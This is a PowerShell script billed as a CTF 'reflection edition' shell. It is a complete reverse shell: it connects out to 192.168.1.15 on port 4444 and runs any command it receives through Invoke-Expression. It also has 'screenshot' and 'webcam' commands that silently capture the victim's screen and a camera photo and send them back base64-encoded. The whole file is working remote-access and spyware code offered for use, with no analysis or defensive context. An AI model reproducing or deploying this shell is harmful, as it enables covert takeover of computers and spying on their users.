# --- THE ULTIMATE ATOMIC CTF SHELL: REFLECTION EDITION ---
$ip = '192.168.1.15'
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient
try {
    $c.Connect($ip, $port)
    $s = $c.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- ATOMIC SHELL: REFLECTION MODE ACTIVE ---")

    while($c.Connected) {
        $w.Write("PS " + (Get-Location).Path + "> ")
        $line = $r.ReadLine()
        if ($null -eq $line) { break }
        $cmd = $line.Trim()
        if ($cmd -eq "exit") { break }

        if ($cmd -eq "screenshot") {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp  = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g    = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem  = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            } catch { $w.WriteLine("Error: $($_.Exception.Message)") }
        } 
        elseif ($cmd -eq "webcam") {
            try {
                [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
                $mc = New-Object Windows.Media.Capture.MediaCapture
                
                # Helper to call GetResults via Reflection
                function Get-WinRTResult($task) {
                    while ($task.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                    return $task.GetType().GetMethod("GetResults").Invoke($task, @())
                }

                # 1. Initialize
                $init = $mc.InitializeAsync()
                $null = Get-WinRTResult $init
                Start-Sleep -Seconds 1 # Hardware Warm-up
                
                # 2. Prepare
                $fmt = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
                $prep = $mc.PrepareLowLagPhotoCaptureAsync($fmt)
                $lowLag = Get-WinRTResult $prep
                
                # 3. Capture
                $snap = $lowLag.CaptureAsync()
                $photo = Get-WinRTResult $snap
                
                # 4. Stream and Convert
                $asStream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($photo.Frame)
                $ms = New-Object System.IO.MemoryStream
                $asStream.CopyTo($ms)
                
                $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                $ms.Dispose(); $asStream.Dispose(); $mc.Dispose()
            } catch {
                $w.WriteLine("Webcam Error: $($_.Exception.Message)")
            }
        } 
        else {
            try {
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                $w.WriteLine(if($out){$out}else{"Done."})
            } catch { $w.WriteLine("Shell Error: $($_.Exception.Message)") }
        }
    }
} catch {
} finally {
    if ($c) { $c.Close() }
}
